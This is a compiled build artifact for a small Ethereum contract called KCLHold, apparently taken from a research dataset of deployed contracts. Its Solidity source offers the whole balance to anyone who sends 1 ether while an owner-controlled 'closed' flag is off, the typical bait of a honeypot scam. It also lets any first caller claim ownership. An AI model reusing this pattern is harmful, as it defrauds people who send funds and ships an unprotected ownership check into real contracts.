{
  "contractName": "KCLHold",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "own",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "F",
          "type": "bool"
        }
      ],
      "name": "open",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "end",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "get",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060146101000a81548160ff02191690831515021790555034801561002a57600080fd5b506102db8061003a6000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636d4ce63c1461006457806399cdee0e1461006e578063a85717d314610078578063efbe1c1c146100a7575b005b61006c6100be565b005b610076610149565b005b34801561008457600080fd5b506100a56004803603810190808035151590602001909291905050506101cc565b005b3480156100b357600080fd5b506100bc61023f565b005b670de0b6b3a764000034101580156100e35750600060149054906101000a900460ff16155b15610147573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610145573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600014156101ca57336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561023c5780600060146101000a81548160ff0219169083151502179055505b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156102ad573373ffffffffffffffffffffffffffffffffffffffff16ff5b5600a165627a7a723058209eeac60fc7f4be2ef5a3597b154b276723e5663d488c5217620397f8f20725590029",
  "source": "\n\ncontract KCLHold {\n    function() public payable {}\n    address Owner; bool closed = false;\n    function own() public payable { if (0==Owner) Owner=msg.sender; }\n    function open(bool F) public { if (msg.sender==Owner) closed=F; }\n    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }\n    function get() public payable {\n        if (msg.value>=1 ether && !closed) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x96299dc3cb5c2a936058a9b200a60f722c721b69/contracts/0x96299dc3cb5c2a936058a9b200a60f722c721b69.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:42:02.856Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}